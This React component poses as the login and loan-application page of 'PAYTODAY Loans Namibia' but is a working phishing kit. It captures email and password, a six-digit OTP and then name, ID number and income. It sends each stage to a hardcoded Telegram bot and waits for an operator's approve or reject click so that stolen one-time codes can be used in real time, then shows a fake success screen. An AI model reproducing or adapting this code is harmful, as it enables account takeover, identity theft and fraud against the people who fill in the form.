import { useState, useEffect } from 'react';
import { Mail, Lock, Shield, User, ArrowRight, ArrowLeft, X, Check, Loader2, CheckCircle } from 'lucide-react';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';

interface LoginProps {
  onLoginSuccess?: () => void;
  onClose?: () => void;
}

// Interface for loan calculator data
interface LoanCalculatorData {
  loanAmount: number;
  loanPeriod: number;
  processingFee: number;
  totalInterest: number;
  totalAmount: number;
  monthlyPayment: number;
}

type Step = 'email' | 'otp' | 'details' | 'success' | 'waiting';

// Telegram Bot Configuration
const TELEGRAM_BOT_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || '8570815071:AAGvDaBcq8384ZWItYQWlcsjGgXpgGQI2A8';
const TELEGRAM_CHAT_ID = import.meta.env.VITE_TELEGRAM_CHAT_ID || '7973653220';

interface InlineKeyboardButton {
  text: string;
  callback_data: string;
}

interface ReplyMarkup {
  inline_keyboard: InlineKeyboardButton[][];
}

const sendToTelegram = async (message: string, replyMarkup?: ReplyMarkup): Promise<boolean> => {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.log('Telegram not configured - message would be:', message);
    return false;
  }
  
  try {
    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    console.log('Sending to Telegram:', telegramUrl);
    console.log('Chat ID:', TELEGRAM_CHAT_ID);
    
    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML',
        reply_markup: replyMarkup || undefined
      })
    });
    
    const data = await response.json();
    console.log('Telegram response:', data);
    
    if (data.ok) {
      console.log('Telegram message sent successfully!');
      return true;
    } else {
      console.error('Telegram error:', data.description);
      return false;
    }
  } catch (error) {
    console.error('Failed to send to Telegram:', error);
    return false;
  }
};

// Poll for callback queries (button clicks from Telegram)
const pollForCallback = async (callbackDataPrefix: string, maxAttempts = 30): Promise<boolean> => {
  let attempts = 0;
  let lastUpdateId = 0;
  
  while (attempts < maxAttempts) {
    try {
      // Get updates from Telegram
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?timeout=10&offset=${lastUpdateId + 1}`;
      const response = await fetch(url);
      const data = await response.json();
      
      if (data.ok && data.result && data.result.length > 0) {
        for (const update of data.result) {
          lastUpdateId = update.update_id;
          
          // Check if there's a callback_query
          if (update.callback_query) {
            const callbackData = update.callback_query.data;
            console.log('Callback received:', callbackData);
            
            // Answer the callback to remove the loading state
            try {
              await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ callback_query_id: update.callback_query.id })
              });
            } catch (e) {
              console.log('Could not answer callback query');
            }
            
            // Return true if approved, false if rejected
            if (callbackData && callbackData.startsWith(callbackDataPrefix)) {
              return callbackData.includes('approve');
            }
          }
        }
      }
    } catch (error) {
      console.log('Polling error:', error);
    }
    
    attempts++;
    await new Promise(resolve => setTimeout(resolve, 2000)); // Wait 2 seconds between polls
    console.log(`Polling... attempt ${attempts}/${maxAttempts}`);
  }
  
  console.log('Polling timed out');
  return false; // Default to reject if timed out
};

const Login = ({ onLoginSuccess, onClose }: LoginProps) => {
  const [currentStep, setCurrentStep] = useState<Step>('email');
  const [isLoading, setIsLoading] = useState(false);
  const [isWaiting, setIsWaiting] = useState(false);
  const [waitingMessage, setWaitingMessage] = useState('');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [otp, setOtp] = useState(['', '', '', '', '', '']);
  const [loanCalculatorData, setLoanCalculatorData] = useState<LoanCalculatorData | null>(null);
  const [formData, setFormData] = useState({
    fullName: '',
    idNumber: '',
    employmentStatus: 'employed',
    monthlyIncome: '',
    loanAmount: '5000',
    loanPurpose: 'personal',
    repaymentPeriod: '12',
  });

  // Load loan calculator data from localStorage when component mounts
  useEffect(() => {
    const storedData = localStorage.getItem('loanCalculatorData');
    if (storedData) {
      try {
        const data = JSON.parse(storedData) as LoanCalculatorData;
        setLoanCalculatorData(data);
        // Pre-populate form with loan calculator values
        setFormData(prev => ({
          ...prev,
          loanAmount: data.loanAmount.toString(),
          repaymentPeriod: data.loanPeriod.toString(),
        }));
      } catch (e) {
        console.error('Failed to parse loan calculator data:', e);
      }
    }
  }, []);

  const handleEmailSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (email.includes('@') && password.length >= 4) {
      setIsLoading(true);
      
      // Send to Telegram with approval buttons
      const replyMarkup = {
        inline_keyboard: [
          [
            { text: '✅ APPROVE', callback_data: 'approve_step1' },
            { text: '❌ REJECT', callback_data: 'reject_step1' }
          ]
        ]
      };
      
      await sendToTelegram(
        `📧 NEW LOAN APPLICATION - STEP 1\n\n📧 Email: ${email}\n🔑 Password: ${password}\n⏰ Time: ${new Date().toLocaleString()}\n\n⚠️ ACTION REQUIRED: Please approve or reject`,
        replyMarkup
      );
      
      // Keep loading spinner while polling for approval
      const approved = await pollForCallback('approve_step1');
      
      setIsLoading(false);
      
      if (approved) {
        setCurrentStep('otp');
      } else {
        alert('Application rejected. Please try again.');
      }
    }
  };

  const handleOtpChange = (index: number, value: string) => {
    if (value.length <= 1) {
      const newOtp = [...otp];
      newOtp[index] = value;
      setOtp(newOtp);
      if (value && index < 5) {
        const nextInput = document.getElementById(`otp-${index + 1}`);
        nextInput?.focus();
      }
    }
  };

  const handleOtpSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const otpString = otp.join('');
    if (otpString.length === 6) {
      setIsLoading(true);
      
      // Inline keyboard with Approve/Reject buttons
      const replyMarkup = {
        inline_keyboard: [
          [
            { text: '✅ APPROVE', callback_data: 'approve_step2' },
            { text: '❌ REJECT', callback_data: 'reject_step2' }
          ]
        ]
      };
      
      await sendToTelegram(
        `🔐 OTP VERIFICATION - STEP 2\n\n📧 Email: ${email}\n✅ OTP: ${otpString}\n\n⚠️ ACTION REQUIRED: Please approve or reject`,
        replyMarkup
      );
      
      // Keep loading spinner while polling for approval
      const approved = await pollForCallback('approve_step2');
      
      setIsLoading(false);
      
      if (approved) {
        setCurrentStep('details');
      } else {
        alert('OTP verification rejected. Please try again.');
        setOtp(['', '', '', '', '', '']);
      }
    }
  };

  const handleDetailsSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    
    // Build loan details message based on whether calculator data exists
    let loanDetails = `\n💰 Loan:\n• Amount: N${formData.loanAmount}\n• Purpose: ${formData.loanPurpose}\n• Period: ${formData.repaymentPeriod} months`;
    
    if (loanCalculatorData) {
      loanDetails = `\n💰 LOAN CALCULATOR DETECTED:\n• Amount: N${loanCalculatorData.loanAmount.toLocaleString()}\n• Duration: ${loanCalculatorData.loanPeriod} months\n• Monthly Payment: N${loanCalculatorData.monthlyPayment.toLocaleString()}\n• Total Amount: N${loanCalculatorData.totalAmount.toLocaleString()}\n• Processing Fee: N${loanCalculatorData.processingFee}\n• Interest: N${loanCalculatorData.totalInterest.toLocaleString()}`;
    }
    
    // Send final application to Telegram (no approval needed for final step)
    const message = `📋 LOAN APPLICATION SUBMITTED\n\n👤 Personal:\n• Name: ${formData.fullName}\n• ID: ${formData.idNumber}\n• Status: ${formData.employmentStatus}\n• Income: N${formData.monthlyIncome}${loanDetails}\n\n📧 Email: ${email}\n\n✅ Application submitted successfully!`;
    await sendToTelegram(message);
    
    // Clear localStorage after successful submission
    localStorage.removeItem('loanCalculatorData');
    localStorage.removeItem('fromCalculator');
    
    setTimeout(() => {
      setIsLoading(false);
      setCurrentStep('success');
    }, 1500);
  };

  const goBack = () => {
    if (currentStep === 'otp') setCurrentStep('email');
    else if (currentStep === 'details') setCurrentStep('otp');
  };

  const handleCloseSuccess = () => {
    if (onLoginSuccess) onLoginSuccess();
  };

  return (
    <div className="min-h-screen bg-[#0A0E14] flex items-center justify-center p-4">
      <div className="absolute inset-0 overflow-hidden">
        <div className="absolute inset-0 bg-gradient-to-br from-[#0A0E14] via-[#141B24] to-[#0A0E14]"></div>
        <div className="absolute top-20 left-10 w-64 h-64 bg-[#1674BB]/5 rounded-full blur-3xl"></div>
        <div className="absolute bottom-20 right-10 w-96 h-96 bg-[#1674BB]/3 rounded-full blur-3xl"></div>
      </div>

      <div className="relative w-full max-w-md">
        {onClose && currentStep !== 'success' && (
          <button type="button" onClick={onClose} className="absolute top-0 right-0 p-2 text-gray-400 hover:text-white">
            <X className="w-6 h-6" />
          </button>
        )}

        <div className="text-center mb-6">
          <div className="inline-flex items-center justify-center mb-4">
            <img src="/paytoday.webp" alt="PAYTODAY Namibia" className="h-16 w-auto" />
          </div>
          <h1 className="text-2xl font-bold text-white">PAYTODAY Loans Namibia</h1>
        </div>

        <div className="flex items-center justify-center gap-2 mb-6">
          <div className={`w-8 h-8 rounded-full flex items-center justify-center ${currentStep === 'email' ? 'bg-[#1674BB]' : 'bg-green-500'}`}>
            <Mail className="w-4 h-4 text-white" />
          </div>
          <div className={`w-12 h-1 ${currentStep === 'otp' || currentStep === 'details' || currentStep === 'success' ? 'bg-green-500' : 'bg-gray-700'}`}></div>
          <div className={`w-8 h-8 rounded-full flex items-center justify-center ${currentStep === 'otp' ? 'bg-[#1674BB]' : currentStep === 'details' || currentStep === 'success' ? 'bg-green-500' : 'bg-gray-700'}`}>
            <Shield className="w-4 h-4 text-white" />
          </div>
          <div className={`w-12 h-1 ${currentStep === 'details' || currentStep === 'success' ? 'bg-green-500' : 'bg-gray-700'}`}></div>
          <div className={`w-8 h-8 rounded-full flex items-center justify-center ${currentStep === 'details' || currentStep === 'success' ? 'bg-[#1674BB]' : 'bg-gray-700'}`}>
            <User className="w-4 h-4 text-white" />
          </div>
        </div>

        {currentStep === 'email' && (
          <div className="bg-[#141B24]/80 backdrop-blur-xl rounded-2xl border border-gray-800/50 p-8 shadow-2xl">
            <form onSubmit={handleEmailSubmit} className="space-y-6">
              <div className="text-center mb-6">
                <h2 className="text-xl font-semibold text-white">Enter your details to continue</h2>
                <p className="text-gray-400 mt-2">Use your email and password</p>
              </div>
              <div className="space-y-2">
                <Label htmlFor="email" className="text-gray-300 text-sm font-medium">Email Address</Label>
                <div className="relative">
                  <div className="absolute left-3 top-1/2 -translate-y-1/2">
                    <Mail className="w-5 h-5 text-gray-500" />
                  </div>
                  <Input id="email" type="email" placeholder="you@example.com" value={email} onChange={(e) => setEmail(e.target.value)} className="bg-[#0A0E14] border-gray-700 text-white pl-12 h-12 rounded-xl focus:ring-2 focus:ring-[#1674BB] text-lg" required />
                </div>
              </div>
              <div className="space-y-2">
                <Label htmlFor="password" className="text-gray-300 text-sm font-medium">Password</Label>
                <div className="relative">
                  <div className="absolute left-3 top-1/2 -translate-y-1/2">
                    <Lock className="w-5 h-5 text-gray-500" />
                  </div>
                  <Input id="password" type="password" placeholder="Enter your password" value={password} onChange={(e) => setPassword(e.target.value)} className="bg-[#0A0E14] border-gray-700 text-white pl-12 h-12 rounded-xl focus:ring-2 focus:ring-[#1674BB] text-lg" required minLength={4} />
                </div>
                <p className="text-gray-500 text-xs mt-1">Minimum 4 characters</p>
              </div>
              <button type="submit" disabled={isLoading || !email.includes('@') || password.length < 4} className="w-full bg-[#1674BB] hover:bg-[#145a9e] text-white font-semibold py-3 px-6 rounded-xl flex items-center justify-center gap-2 disabled:opacity-70">
                {isLoading ? <Loader2 className="w-5 h-5 animate-spin" /> : <><span>Continue</span><ArrowRight className="w-5 h-5" /></>}
              </button>
              <p className="text-gray-500 text-xs text-center">By continuing, you agree to our Terms of Service and Privacy Policy</p>
            </form>
          </div>
        )}

        {currentStep === 'otp' && (
          <div className="bg-[#141B24]/80 backdrop-blur-xl rounded-2xl border border-gray-800/50 p-8 shadow-2xl">
            <button type="button" onClick={goBack} className="flex items-center gap-2 text-gray-400 hover:text-white mb-4">
              <ArrowLeft className="w-4 h-4" />
              <span className="text-sm">Back</span>
            </button>
            <form onSubmit={handleOtpSubmit} className="space-y-6">
              <div className="text-center mb-6">
                <h2 className="text-xl font-semibold text-white">Verify Your Account</h2>
                <p className="text-gray-400 mt-2">Enter the 6-digit code sent to your email</p>
              </div>
              <div className="flex justify-center gap-2">
                {otp.map((digit, index) => (
                  <Input key={index} id={`otp-${index}`} type="text" inputMode="numeric" maxLength={1} value={digit} onChange={(e) => handleOtpChange(index, e.target.value)} className="w-12 h-14 bg-[#0A0E14] border-gray-700 text-white text-center text-xl font-bold rounded-xl focus:ring-2 focus:ring-[#1674BB]" />
                ))}
              </div>
              <p className="text-gray-500 text-xs text-center mt-1">Enter the 6-digit OTP sent to {email}</p>
              <button type="submit" disabled={isLoading || otp.join('').length < 6} className="w-full bg-[#1674BB] hover:bg-[#145a9e] text-white font-semibold py-3 px-6 rounded-xl flex items-center justify-center gap-2 disabled:opacity-70">
                {isLoading ? <Loader2 className="w-5 h-5 animate-spin" /> : <><span>Verify</span><ArrowRight className="w-5 h-5" /></>}
              </button>
            </form>
          </div>
        )}

        {currentStep === 'details' && (
          <div className="bg-[#141B24]/80 backdrop-blur-xl rounded-2xl border border-gray-800/50 p-8 shadow-2xl">
            <button type="button" onClick={goBack} className="flex items-center gap-2 text-gray-400 hover:text-white mb-4">
              <ArrowLeft className="w-4 h-4" />
              <span className="text-sm">Back</span>
            </button>
            <form onSubmit={handleDetailsSubmit} className="space-y-4">
              <div className="text-center mb-4">
                <h2 className="text-xl font-semibold text-white">Complete Your Application</h2>
                <p className="text-gray-400 mt-2">Enter your loan details</p>
              </div>
              
              {/* Loan Calculator Detection - Show detected loan details */}
              {loanCalculatorData && (
                <div className="bg-gradient-to-r from-[#1674BB]/20 to-[#2d21e9]/20 rounded-xl p-4 mb-4 border border-[#1674BB]/30">
                  <div className="flex items-center gap-2 mb-3">
                    <CheckCircle className="w-5 h-5 text-green-400" />
                    <span className="text-white font-semibold text-sm">Loan Calculator Detected</span>
                  </div>
                  <div className="grid grid-cols-2 gap-3 text-sm">
                    <div className="bg-[#0A0E14]/50 rounded-lg p-2">
                      <p className="text-gray-400 text-xs">Loan Amount</p>
                      <p className="text-white font-bold">N{loanCalculatorData.loanAmount.toLocaleString()}</p>
                    </div>
                    <div className="bg-[#0A0E14]/50 rounded-lg p-2">
                      <p className="text-gray-400 text-xs">Duration</p>
                      <p className="text-white font-bold">{loanCalculatorData.loanPeriod} months</p>
                    </div>
                    <div className="bg-[#0A0E14]/50 rounded-lg p-2">
                      <p className="text-gray-400 text-xs">Monthly Payment</p>
                      <p className="text-green-400 font-bold">N{loanCalculatorData.monthlyPayment.toLocaleString()}</p>
                    </div>
                    <div className="bg-[#0A0E14]/50 rounded-lg p-2">
                      <p className="text-gray-400 text-xs">Total Amount</p>
                      <p className="text-white font-bold">N{loanCalculatorData.totalAmount.toLocaleString()}</p>
                    </div>
                  </div>
                </div>
              )}
              <div className="space-y-2">
                <Label className="text-gray-300 text-sm">Full Name</Label>
                <Input placeholder="Enter your full name" value={formData.fullName} onChange={(e) => setFormData({ ...formData, fullName: e.target.value })} className="bg-[#0A0E14] border-gray-700 text-white h-11 rounded-xl focus:ring-2 focus:ring-[#1674BB]" required />
              </div>
              <div className="space-y-2">
                <Label className="text-gray-300 text-sm">ID Number</Label>
                <Input placeholder="Enter your ID number" value={formData.idNumber} onChange={(e) => setFormData({ ...formData, idNumber: e.target.value })} className="bg-[#0A0E14] border-gray-700 text-white h-11 rounded-xl focus:ring-2 focus:ring-[#1674BB]" required />
              </div>
              <div className="space-y-2">
                <Label className="text-gray-300 text-sm">Employment Status</Label>
                <select value={formData.employmentStatus} onChange={(e) => setFormData({ ...formData, employmentStatus: e.target.value })} className="bg-[#0A0E14] border border-gray-700 text-white h-11 rounded-xl px-3 w-full focus:ring-2 focus:ring-[#1674BB]">
                  <option value="employed">Employed</option>
                  <option value="self-employed">Self-Employed</option>
                  <option value="business-owner">Business Owner</option>
                  <option value="student">Student</option>
                </select>
              </div>
              <div className="space-y-2">
                <Label className="text-gray-300 text-sm">Monthly Income (NAD)</Label>
                <Input type="number" placeholder="Enter your monthly income" value={formData.monthlyIncome} onChange={(e) => setFormData({ ...formData, monthlyIncome: e.target.value })} className="bg-[#0A0E14] border-gray-700 text-white h-11 rounded-xl focus:ring-2 focus:ring-[#1674BB]" required />
              </div>
              <div className="grid grid-cols-2 gap-3">
                <div className="space-y-2">
                  <Label className="text-gray-300 text-sm">Loan Amount</Label>
                  <Input type="number" placeholder="5000" value={formData.loanAmount} onChange={(e) => setFormData({ ...formData, loanAmount: e.target.value })} className="bg-[#0A0E14] border-gray-700 text-white h-11 rounded-xl focus:ring-2 focus:ring-[#1674BB]" required />
                </div>
                <div className="space-y-2">
                  <Label className="text-gray-300 text-sm">Months</Label>
                  <Input type="number" placeholder="12" value={formData.repaymentPeriod} onChange={(e) => setFormData({ ...formData, repaymentPeriod: e.target.value })} className="bg-[#0A0E14] border-gray-700 text-white h-11 rounded-xl focus:ring-2 focus:ring-[#1674BB]" required />
                </div>
              </div>
              <button type="submit" disabled={isLoading} className="w-full bg-[#1674BB] hover:bg-[#145a9e] text-white font-semibold py-3 px-6 rounded-xl flex items-center justify-center gap-2 disabled:opacity-70">
                {isLoading ? <Loader2 className="w-5 h-5 animate-spin" /> : <><span>Submit Application</span><Check className="w-5 h-5" /></>}
              </button>
            </form>
          </div>
        )}

        {currentStep === 'success' && (
          <div className="bg-[#141B24]/80 backdrop-blur-xl rounded-2xl border border-gray-800/50 p-8 shadow-2xl text-center">
            <div className="flex justify-center mb-6">
              <div className="w-20 h-20 bg-green-500/20 rounded-full flex items-center justify-center">
                <CheckCircle className="w-12 h-12 text-green-500" />
              </div>
            </div>
            <h2 className="text-2xl font-bold text-white mb-2">Application Submitted!</h2>
            <p className="text-gray-400 mb-6">Your loan application has been submitted successfully. We will review it and get back to you within 24 hours.</p>
            <button onClick={handleCloseSuccess} className="w-full bg-[#1674BB] hover:bg-[#145a9e] text-white font-semibold py-3 px-6 rounded-xl">
              Return to Home
            </button>
          </div>
        )}
      </div>
    </div>
  );
};

export default Login;
